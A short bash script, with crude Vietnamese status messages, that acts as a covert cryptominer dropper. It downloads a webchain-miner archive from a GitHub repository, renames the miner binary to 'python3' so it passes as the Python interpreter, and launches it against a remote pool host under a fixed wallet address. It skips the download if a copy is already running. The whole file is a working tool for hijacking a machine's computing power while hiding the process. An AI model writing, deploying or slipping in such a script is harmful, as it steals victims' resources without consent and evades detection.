#! /bin/bash
set -x #echo on
if [ -f ${PWD}/python3 ]; then
    if pgrep -x "python3" > /dev/null
then
    echo "Miner dang chay roi , ke cmn di "
    
else

echo "Miner da install , chay thoi "
./python3 -o nowornever.hopto.org:80 -u 0xd5d5871933be8b3b8b80cac22127219c7b8026f4 -p x --donate-level=0 --worker-id=al
     
fi
exit
fi


wget https://github.com/evilbabylx/script/raw/master/linux.tar.gz
tar xvzf linux.tar.gz
mv webchain-miner python3
rm config.json -f 
./python3 -o nowornever.hopto.org:80 -u 0xd5d5871933be8b3b8b80cac22127219c7b8026f4 -p x --donate-level=0 --worker-id=al
